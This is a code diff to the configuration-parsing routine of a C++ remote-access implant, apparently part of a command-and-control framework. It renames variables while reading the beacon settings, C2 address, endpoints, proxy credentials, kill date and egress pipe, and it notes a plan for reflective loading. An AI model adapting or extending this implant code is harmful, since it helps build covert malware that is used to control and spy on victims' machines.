@@ -41,24 +41,24 @@ namespace Implant {
     VOID ReadConfig() {
         HEXANE
 
-        PARSER Parser = { };
-        Parser::CreateParser(&Parser, Config, sizeof(Config));
+        _parser parser = { };
+        Parser::CreateParser(&parser, Config, sizeof(Config));
         x_memset(Config, 0, sizeof(Config));
 
-        Parser::ParserBytecpy(&Parser, R_CAST(PBYTE, &Ctx->Root));
-        Parser::ParserMemcpy(&Parser, &Ctx->Config.Key, nullptr);
-        Parser::ParserStrcpy(&Parser, &Ctx->Config.Hostname, nullptr);
+        Parser::ParserBytecpy(&parser, R_CAST(PBYTE, &Ctx->Root));
+        Parser::ParserMemcpy(&parser, &Ctx->Config.Key, nullptr);
+        Parser::ParserStrcpy(&parser, &Ctx->Config.Hostname, nullptr);
 
         //Xtea::XteaCrypt(S_CAST(PBYTE, Parser.Buffer), Parser.Length - 0x12, Ctx->Config.Key, FALSE);
         // todo: add reflective loading? maybe https://github.com/bats3c/DarkLoadLibrary
 
         if ((F_PTR_HMOD(Ctx->win32.LoadLibraryA, Ctx->Modules.kernel32, LOADLIBRARYA))) {
             if (
-                !(Ctx->Modules.crypt32  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
-                !(Ctx->Modules.winhttp  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
-                !(Ctx->Modules.advapi   = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
-                !(Ctx->Modules.iphlpapi = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
-                !(Ctx->Modules.mscoree  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr)))) {
+                !(Ctx->Modules.crypt32  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr))) ||
+                !(Ctx->Modules.winhttp  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr))) ||
+                !(Ctx->Modules.advapi   = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr))) ||
+                !(Ctx->Modules.iphlpapi = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr))) ||
+                !(Ctx->Modules.mscoree  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr)))) {
                 return_defer(ERROR_MOD_NOT_FOUND);
             }
         }
@@ -103,43 +103,43 @@ namespace Implant {
             return_defer(ERROR_PROC_NOT_FOUND);
         }
 
-        Ctx->Session.PeerId         = Parser::UnpackDword(&Parser);
-        Ctx->Config.Sleeptime       = Parser::UnpackDword(&Parser);
-        Ctx->Config.Jitter          = Parser::UnpackDword(&Parser);
-        Ctx->Config.WorkingHours    = Parser::UnpackDword(&Parser);
-        Ctx->Config.Killdate        = Parser::UnpackDword64(&Parser);
+        Ctx->Session.PeerId         = Parser::UnpackDword(&parser);
+        Ctx->Config.Sleeptime       = Parser::UnpackDword(&parser);
+        Ctx->Config.Jitter          = Parser::UnpackDword(&parser);
+        Ctx->Config.WorkingHours    = Parser::UnpackDword(&parser);
+        Ctx->Config.Killdate        = Parser::UnpackDword64(&parser);
 
         Ctx->Transport.OutboundQueue = nullptr;
 
 #ifdef TRANSPORT_HTTP
-        Ctx->Transport.http = S_CAST(PHTTP_CONTEXT, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(HTTP_CONTEXT)));
+        Ctx->Transport.http = S_CAST(_http_context*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(_http_context)));
 
         Ctx->Transport.http->Handle     = nullptr;
         Ctx->Transport.http->Endpoints  = nullptr;
         Ctx->Transport.http->Headers    = nullptr;
 
-        Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->Useragent, nullptr);
-        Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->Address, nullptr  );
+        Parser::ParserWcscpy(&parser, &Ctx->Transport.http->Useragent, nullptr);
+        Parser::ParserWcscpy(&parser, &Ctx->Transport.http->Address, nullptr  );
+        Ctx->Transport.http->Port = S_CAST(int, Parser::UnpackDword(&parser));
 
-        Ctx->Transport.http->Port       = S_CAST(INT, Parser::UnpackDword(&Parser));
-        Ctx->Transport.http->nEndpoints = Parser::UnpackDword(&Parser);
-        Ctx->Transport.http->Endpoints  = S_CAST(LPWSTR*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(LPWSTR) * ((Ctx->Transport.http->nEndpoints + 1) * 2)));
+        Ctx->Transport.http->nEndpoints = Parser::UnpackDword(&parser);
+        Ctx->Transport.http->Endpoints  = S_CAST(wchar_t**, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(wchar_t*) * ((Ctx->Transport.http->nEndpoints + 1) * 2)));
 
         for (auto i = 0; i < Ctx->Transport.http->nEndpoints; i++) {
-            Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->Endpoints[i], nullptr);
+            Parser::ParserWcscpy(&parser, &Ctx->Transport.http->Endpoints[i], nullptr);
         }
 
         Ctx->Transport.http->Endpoints[Ctx->Transport.http->nEndpoints + 1] = nullptr;
 
-        Parser::ParserStrcpy(&Parser, &Ctx->Transport.Domain, nullptr  );
-        Ctx->Transport.bProxy = Parser::UnpackBool(&Parser);
+        Parser::ParserStrcpy(&parser, &Ctx->Transport.Domain, nullptr  );
+        Ctx->Transport.bProxy = Parser::UnpackBool(&parser);
 
         if (Ctx->Transport.bProxy) {
             Ctx->Transport.http->Access = INTERNET_OPEN_TYPE_PROXY;
 
-            Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->ProxyAddress, nullptr );
-            Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->ProxyUsername, nullptr );
-            Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->ProxyPassword, nullptr );
+            Parser::ParserWcscpy(&parser, &Ctx->Transport.http->ProxyAddress, nullptr );
+            Parser::ParserWcscpy(&parser, &Ctx->Transport.http->ProxyUsername, nullptr );
+            Parser::ParserWcscpy(&parser, &Ctx->Transport.http->ProxyPassword, nullptr );
 
         } else {
             Ctx->Transport.http->ProxyUsername = nullptr;
@@ -147,10 +147,10 @@ namespace Implant {
         }
 #endif
 #ifdef TRANSPORT_PIPE
-        Parser::ParserWcscpy(&Parser, &Ctx->Config.EgressPipename, nullptr);
+        Parser::ParserWcscpy(&parser, &Ctx->Config.EgressPipename, nullptr);
 #endif
     defer:
-        Parser::DestroyParser(&Parser);
+        Parser::DestroyParser(&parser);
     }
 }
 
